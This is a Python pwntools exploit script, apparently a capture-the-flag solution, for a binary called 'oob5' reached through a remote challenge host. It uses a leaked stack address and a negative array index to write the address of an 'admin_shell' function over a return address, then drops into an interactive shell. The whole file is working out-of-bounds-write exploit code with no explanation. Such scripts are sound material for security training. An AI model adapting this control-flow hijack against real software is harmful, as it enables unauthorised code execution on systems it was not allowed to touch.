#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = 0

c = 0
pwn_file = "./oob5"
elf = ELF(pwn_file)
if debug == 1:
    c = process(pwn_file)
else:
    c = remote('140.110.112.77', 3115)

context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if debug:
    gdbcmd = '''
    '''

    gdb.attach(c, gdbcmd)
    context.log_level ='debug'

context.log_level ='debug'
rbp = p64(0x12334)



c.recvuntil('Stack Ref = ')
rbp = int(c.recvline()[:-1], 16) + 0x28
ret_addr = rbp + 0x00007ffdb94f9df0-0x00007ffdb94f9e20 - 0x10


print(hex(ret_addr))
c.sendlineafter('ID:', str((-elf.symbols['user'] + ret_addr) // 8))
c.sendlineafter('Nickname:', p64(elf.symbols['admin_shell']))
#c.sendlineafter('PIN: ', '1')
#c.recvuntil('['

c.interactive()
c.close()
